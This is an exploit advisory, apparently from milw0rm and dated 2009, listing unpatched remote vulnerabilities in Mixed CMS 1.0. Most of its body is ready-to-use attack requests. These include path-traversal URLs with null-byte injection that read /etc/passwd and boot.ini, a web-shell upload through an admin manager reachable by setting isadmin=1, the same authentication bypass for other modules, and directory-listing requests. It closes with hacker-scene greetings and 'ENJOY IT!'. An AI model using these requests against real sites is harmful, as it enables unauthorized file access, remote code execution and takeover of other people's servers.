@@ -1,0 +1,105 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| 	  Mixed CMS 1.0        |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://sourceforge.net/projects/mixedcms/				             |
+|-->DOWNLOAD: http://sourceforge.net/projects/mixedcms/ 	   		             |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: MixedCMS is a cms that gives easiest way to create our own website	     |
+|-->RELEASED: 2009-04-21								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: N/A (It's too new)								     |
+|-->CATEGORY: LFI/UPLOAD-SHELL/AUTH-BYPASS/FILES DISCLOSURE				     |
+|-->AFFECT VERSION:1.0						     			     |
+|-->Discovered Bug date: 2009-04-21							     |
+|-->Reported Bug date: 2009-04-21							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+----------------------------------------------------------------------------------------------
+
+-----------------------------
+LOCAL FILE INCLUSION (LFI)
+-----------------------------
+
+
+1)http://[HOST]/[HOME_PATH]/modules/mod.php?mod=../../../../../../../boot.ini%00
+
+2)http://127.0.0.1/[HOST]/[HOME_PATH]/modules/mod.php?mod=../../../../../etc/passwd%00
+
+-----------------------------
+SHELL UPLOAD VULNERABILITY
+-----------------------------
+
+-->shell <= 1KB.
+
+http://[HOST]/[HOME_PATH]/modules/mod.php?mod=download&op=manager&isadmin=1
+
+Here we add a download and upload the shell exploit.
+
+Then, if you go to the link (Boom!):
+
+http://[HOST]/[HOME_PATH]/modules/mod/download/archieves/shell.php
+
+---------------------------
+AUTHENTICATION BYPASS
+---------------------------
+
+Authetication is not needed (only isadmin=1 and change op/mod var to browse)
+
+http://[HOST]/[HOME_PATH]/modules/mod.php?mod=newsfeed&op=manager&isadmin=1
+
+------------------
+FILES DISCLOSURE
+------------------
+
+http://[HOST]/[HOME_PATH]/modules/mod/download/DocMan.php?path=./../download/archieves/
+
+Use path variable (request) to browse other paths for example:
+
+http://127.0.0.1/[HOME_PATH]/modules/mod/download/DocMan.php?path=./../../../engine/
+
+
+
+I'm sure that SQL Injection (or Blind) is here but with this, for what?
+
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+-------------------------------------------------------------------
+*******************************************************************
+ GREETZ TO: JosS and all spanish Hack3Rs community!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-21]
